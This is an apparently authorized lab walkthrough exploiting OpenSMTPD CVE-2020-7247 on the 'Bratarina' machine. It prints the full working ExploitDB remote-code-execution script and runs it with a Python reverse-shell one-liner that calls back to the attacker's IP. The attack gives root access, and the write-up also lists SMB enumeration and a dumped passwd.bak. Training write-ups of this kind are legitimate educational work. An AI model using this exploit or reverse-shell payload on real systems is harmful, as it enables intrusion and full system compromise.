# Bratarina

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Difficulty: Easy
Community Rating: Intermediate
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 10
Number of Flags: 1
Lab Description:
This lab challenges learners to exploit OpenSMTPD version 6.6.2 through a remote code execution vulnerability 
(CVE-2020-7247). Learners will uncover and exploit the flaw to gain remote access and achieve a reverse shell 
on the target machine, highlighting critical concepts of SMTP service exploitation and post-exploitation techniques.
Released: 6 Aug 2020
```

Machine link: [https://portal.offsec.com/machine/bratarina-159/overview/details](https://portal.offsec.com/machine/bratarina-159/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ export TARGET_IP=192.168.219.71 

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-19 15:59 +0100
Nmap scan report for 192.168.219.71
Host is up (0.030s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.167], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
53/tcp  closed domain
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
|_http-server-header: nginx/1.14.0 (Ubuntu)
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-03-19T15:01:42
|_  start_date: N/A
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00
|   FQDN: bratarina
|_  System time: 2026-03-19T11:01:40-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.93 seconds
```

We have four services running and available:

- OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 on port 22
- OpenSMTPD on port 25
- nginx 1.14.0 on port 80
- Samba smbd 4.7.6-Ubuntu on port 445

### Check for SMB Shares

Next, we check for available SMB shares and their content

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ nxc smb $TARGET_IP -u '' -p '' --shares    
SMB         192.168.219.71  445    BRATARINA        [*] Unix - Samba (name:BRATARINA) (domain:) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         192.168.219.71  445    BRATARINA        [+] \: (Guest)
SMB         192.168.219.71  445    BRATARINA        [*] Enumerated shares
SMB         192.168.219.71  445    BRATARINA        Share           Permissions     Remark
SMB         192.168.219.71  445    BRATARINA        -----           -----------     ------
SMB         192.168.219.71  445    BRATARINA        backups         READ            Share for backups
SMB         192.168.219.71  445    BRATARINA        IPC$                            IPC Service (Samba 4.7.6-Ubuntu)

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ smbclient -N //$TARGET_IP/backups -c 'recurse;ls'
Anonymous login successful
  .                                   D        0  Mon Jul  6 09:46:41 2020
  ..                                  D        0  Mon Jul  6 09:46:41 2020
  passwd.bak                          N     1747  Mon Jul  6 09:46:41 2020

                10253588 blocks of size 1024. 6355336 blocks available

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ smbclient -N //$TARGET_IP/backups -c 'get passwd.bak'
Anonymous login successful
getting file \passwd.bak of size 1747 as passwd.bak (13.6 KiloBytes/sec) (average 13.6 KiloBytes/sec)

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ cat passwd.bak   
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ 
```

Nothing too much exciting there!

### Check the web site

Browsing manually to port 80 shows a "broken" FlaskBB site

![Web Site on Bratarina](Images/Web_Site_on_Bratarina.png)

### Search for available exploit(s)

Let's check for available exploits for OpenSMTPD

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ searchsploit opensmtpd     
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                                                                                                        | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)                                                                                                    | linux/local/48185.rb
OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution                                                                                    | openbsd/remote/48051.pl
OpenSMTPD 6.6.1 - Remote Code Execution                                                                                                                         | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                                                                                                                           | linux/remote/48139.c
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                                                                        | openbsd/remote/48140.c
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ searchsploit -m 47984 
  Exploit: OpenSMTPD 6.6.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47984
     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
    Codes: CVE-2020-7247
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /mnt/hgfs/OffSec_PG/PG_Practice/Easy/Bratarina/47984.py


┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ cat 47984.py     
# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Original Author: Qualys Security Advisory
# Vendor Homepage: https://www.opensmtpd.org/
# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
# Version: OpenSMTPD < 6.6.2
# Tested on: Debian 9.11 (x64)
# CVE: CVE-2020-7247
# References:
# https://www.openwall.com/lists/oss-security/2020/01/28/3
#
# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
# escape dangerous characters from user-controlled input. An attacker
# can exploit this to execute arbitrary shell commands on the target.
#
#!/usr/local/bin/python3

from socket import *
import sys

if len(sys.argv) != 4:
    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
    sys.exit(1)

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
CMD = sys.argv[3]

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))

res = s.recv(1024)
if 'OpenSMTPD' not in str(res):
    print('[!] No OpenSMTPD detected')
    print('[!] Received {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] OpenSMTPD detected')
s.send(b'HELO x\r\n')
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error connecting, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Connected, sending payload')
s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error sending payload, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Payload sent')
s.send(b'RCPT TO:<root>\r\n')
s.recv(1024)
s.send(b'DATA\r\n')
s.recv(1024)
s.send(b'\r\nxxx\r\n.\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.recv(1024)
print('[*] Done')

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ python 47984.py
Usage 47984.py <target ip> <target port> <command>
E.g. 47984.py 127.0.0.1 25 'touch /tmp/x'

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ 
```

### Get a reverse shell

First we start a netcat listener. I first tried my standard port (12345) but changed to port 80 when that didn't work.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ nc -lvnp 80   
listening on [any] 80 ...

```

And then execute the exploit with a Python reverse shell payload from [revshells.com](https://www.revshells.com/)

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ python 47984.py $TARGET_IP 25 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.167\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

Checking back to the netcat listener we have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Bratarina]
└─$ nc -lvnp 80   
listening on [any] 80 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.219.71] 46446
root@bratarina:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bratarina:~# 
```

Well, we are running as root!

### Get the root flag

So we can just get the root flag

```bash
root@bratarina:~# cd /root
cd /root
root@bratarina:~# ls -l
ls -l
total 4
-rw-r--r-- 1 root root 33 Mar 19 10:56 proof.txt
root@bratarina:~# cat proof.txt 
cat proof.txt
9<REDACTED>b
root@bratarina:~# 
```

For additional information, please see the references below.

## References

- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [NetExec - GitHub](https://github.com/Pennyw0rth/NetExec)
- [NetExec - Kali Tools](https://www.kali.org/tools/netexec/)
- [NetExec - Wiki](https://www.netexec.wiki)
- [Nginx - Wikipedia](https://en.wikipedia.org/wiki/Nginx)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSMTPD 6.6.1 - Remote Code Execution - ExploitDB](https://www.exploit-db.com/exploits/47984)
- [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [Reverse Shell Generator - Homepage](https://www.revshells.com/)
- [Samba (software) - Wikipedia](https://en.wikipedia.org/wiki/Samba_(software))
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
- [smbclient - Kali Tools](https://www.kali.org/tools/samba/#smbclient)
- [smbclient - Linux manual page](https://linux.die.net/man/1/smbclient)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
